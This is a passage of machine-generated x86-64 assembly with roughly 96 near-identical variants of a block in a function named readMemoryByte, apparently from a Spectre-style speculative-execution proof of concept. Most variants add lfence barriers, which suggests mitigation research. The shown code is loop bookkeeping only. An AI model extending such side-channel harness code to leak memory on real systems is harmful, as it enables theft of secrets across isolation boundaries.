	jmp	.LreadMemoryByte_win5_var0
## Variant 0
.LreadMemoryByte_win5_var0:
	popq	%rax
	cmpl	$255, -96(%rbp)
	jle	.L18
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 1
.LreadMemoryByte_win5_var1:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 2
.LreadMemoryByte_win5_var2:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 3
.LreadMemoryByte_win5_var3:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 4
.LreadMemoryByte_win5_var4:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 5
.LreadMemoryByte_win5_var5:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 6
.LreadMemoryByte_win5_var6:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 7
.LreadMemoryByte_win5_var7:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 8
.LreadMemoryByte_win5_var8:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 9
.LreadMemoryByte_win5_var9:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 10
.LreadMemoryByte_win5_var10:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 11
.LreadMemoryByte_win5_var11:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 12
.LreadMemoryByte_win5_var12:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 13
.LreadMemoryByte_win5_var13:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 14
.LreadMemoryByte_win5_var14:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 15
.LreadMemoryByte_win5_var15:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 16
.LreadMemoryByte_win5_var16:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 17
.LreadMemoryByte_win5_var17:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 18
.LreadMemoryByte_win5_var18:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 19
.LreadMemoryByte_win5_var19:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 20
.LreadMemoryByte_win5_var20:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 21
.LreadMemoryByte_win5_var21:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 22
.LreadMemoryByte_win5_var22:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 23
.LreadMemoryByte_win5_var23:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 24
.LreadMemoryByte_win5_var24:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 25
.LreadMemoryByte_win5_var25:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 26
.LreadMemoryByte_win5_var26:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 27
.LreadMemoryByte_win5_var27:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 28
.LreadMemoryByte_win5_var28:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 29
.LreadMemoryByte_win5_var29:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 30
.LreadMemoryByte_win5_var30:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 31
.LreadMemoryByte_win5_var31:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 32
.LreadMemoryByte_win5_var32:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 33
.LreadMemoryByte_win5_var33:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 34
.LreadMemoryByte_win5_var34:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 35
.LreadMemoryByte_win5_var35:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 36
.LreadMemoryByte_win5_var36:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 37
.LreadMemoryByte_win5_var37:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 38
.LreadMemoryByte_win5_var38:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 39
.LreadMemoryByte_win5_var39:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 40
.LreadMemoryByte_win5_var40:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 41
.LreadMemoryByte_win5_var41:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 42
.LreadMemoryByte_win5_var42:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 43
.LreadMemoryByte_win5_var43:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 44
.LreadMemoryByte_win5_var44:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 45
.LreadMemoryByte_win5_var45:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 46
.LreadMemoryByte_win5_var46:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 47
.LreadMemoryByte_win5_var47:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 48
.LreadMemoryByte_win5_var48:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 49
.LreadMemoryByte_win5_var49:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 50
.LreadMemoryByte_win5_var50:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 51
.LreadMemoryByte_win5_var51:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 52
.LreadMemoryByte_win5_var52:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 53
.LreadMemoryByte_win5_var53:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 54
.LreadMemoryByte_win5_var54:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 55
.LreadMemoryByte_win5_var55:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 56
.LreadMemoryByte_win5_var56:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 57
.LreadMemoryByte_win5_var57:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 58
.LreadMemoryByte_win5_var58:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 59
.LreadMemoryByte_win5_var59:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 60
.LreadMemoryByte_win5_var60:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 61
.LreadMemoryByte_win5_var61:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 62
.LreadMemoryByte_win5_var62:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 63
.LreadMemoryByte_win5_var63:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 64
.LreadMemoryByte_win5_var64:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 65
.LreadMemoryByte_win5_var65:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 66
.LreadMemoryByte_win5_var66:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 67
.LreadMemoryByte_win5_var67:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 68
.LreadMemoryByte_win5_var68:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 69
.LreadMemoryByte_win5_var69:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 70
.LreadMemoryByte_win5_var70:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 71
.LreadMemoryByte_win5_var71:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 72
.LreadMemoryByte_win5_var72:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 73
.LreadMemoryByte_win5_var73:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 74
.LreadMemoryByte_win5_var74:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 75
.LreadMemoryByte_win5_var75:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 76
.LreadMemoryByte_win5_var76:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 77
.LreadMemoryByte_win5_var77:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 78
.LreadMemoryByte_win5_var78:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 79
.LreadMemoryByte_win5_var79:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 80
.LreadMemoryByte_win5_var80:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 81
.LreadMemoryByte_win5_var81:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 82
.LreadMemoryByte_win5_var82:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 83
.LreadMemoryByte_win5_var83:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 84
.LreadMemoryByte_win5_var84:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 85
.LreadMemoryByte_win5_var85:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 86
.LreadMemoryByte_win5_var86:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 87
.LreadMemoryByte_win5_var87:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 88
.LreadMemoryByte_win5_var88:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 89
.LreadMemoryByte_win5_var89:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 90
.LreadMemoryByte_win5_var90:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 91
.LreadMemoryByte_win5_var91:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 92
.LreadMemoryByte_win5_var92:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 93
.LreadMemoryByte_win5_var93:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 94
.LreadMemoryByte_win5_var94:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 95
.LreadMemoryByte_win5_var95:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
